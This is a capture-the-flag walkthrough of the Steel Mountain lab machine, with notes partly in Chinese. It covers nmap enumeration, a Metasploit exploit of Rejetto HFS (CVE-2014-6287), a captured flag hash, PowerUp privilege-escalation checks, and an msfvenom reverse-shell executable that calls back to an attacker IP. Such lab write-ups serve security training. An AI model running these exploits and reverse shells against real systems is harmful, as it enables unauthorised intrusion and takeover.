# Steel Mountain
 `this machine does not respond to ping (ICMP)`
## nmap 
```
nmap -sV -sC -Pn 10.10.34.174                              130 ⨯
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-18 11:33 EST
Nmap scan report for 10.10.34.174
Host is up (0.26s latency).
Not shown: 989 closed tcp ports (reset)
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
|_http-server-header: Microsoft-IIS/8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: STEELMOUNTAIN
|   NetBIOS_Domain_Name: STEELMOUNTAIN
|   NetBIOS_Computer_Name: STEELMOUNTAIN
|   DNS_Domain_Name: steelmountain
|   DNS_Computer_Name: steelmountain
|   Product_Version: 6.3.9600
|_  System_Time: 2022-01-18T16:35:11+00:00
| ssl-cert: Subject: commonName=steelmountain
| Not valid before: 2022-01-17T16:31:26
|_Not valid after:  2022-07-19T16:31:26
|_ssl-date: 2022-01-18T16:35:15+00:00; 0s from scanner time.
8080/tcp  open  http               HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-server-header: HFS 2.3
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.0.2: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:77:d0:a6:c9:c5 (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2022-01-18T16:35:09
|_  start_date: 2022-01-18T16:31:16

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 104.27 seconds
```

## go 8080 port 
```
HttpFileServer 2.3

google:HttpFileServer 2.3

```
 # task2 

 ```
 1.8080 

 2. Rejetto HTTP File Server

 3. CVE:2014-6287


 4. msf :
  search 2014-6287

  use 0 exploit/windows/http/rejetto_hfs_exec

msf6 exploit(windows/http/rejetto_hfs_exec) > set lhost 10.9.1.50
lhost => 10.9.1.50
msf6 exploit(windows/http/rejetto_hfs_exec) > set rhosts 10.10.235.130
rhosts => 10.10.235.130
msf6 exploit(windows/http/rejetto_hfs_exec) > set rport 8080
rport => 8080
msf6 exploit(windows/http/rejetto_hfs_exec) > run

 ```

 ## meterpreter
 ```
cd C:\Users\bill\Desktop

type user.txt
b04763b6fcf51fcd7c13abc7db4fd365

 ```


 # task3

 ## upload script

 ```
 meterpreter > upload /tmp/PowerUp.ps1
[*] uploading  : /tmp/PowerUp.ps1 -> PowerUp.ps1
[*] Uploaded 586.50 KiB of 586.50 KiB (100.0%): /tmp/PowerUp.ps1 -> PowerUp.ps1
[*] uploaded   : /tmp/PowerUp.ps1 -> PowerUp.ps1

 ```

 ## load powershell 

 ```
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS > 
 ```


```
PS > . .\PowerUp.ps1        
PS > Invoke-AllChecks


ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

```
密切注意設置為 true 的 CanRestart 選項。顯示為未引用服務路徑漏洞的服務名稱是什麼？   

`AdvancedSystemCareService9`
CanRestart 選項為真，允許我們重新啟動系統上的服務，應用程序的目錄也是可寫的。這意味著我們可以用我們的惡意應用程序替換合法應用程序，重新啟動服務，這將運行我們受感染的程序！

## msfvenom
```
msfvenom -p windows/shell_reverse_tcp lhost=10.9.1.50 lport=4343 -e  x86/shkata_ga_nai -f exe -o advanced.exe
```

## upload venom
```
meterpreter > upload /home/kali/Desktop/advanced.exe
[*] uploading  : /home/kali/Desktop/advanced.exe -> advanced.exe
[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): /home/kali/Desktop/advanced.exe -> advanced.exe
[*] uploaded   : /home/kali/Desktop/advanced.exe -> advanced.exe

```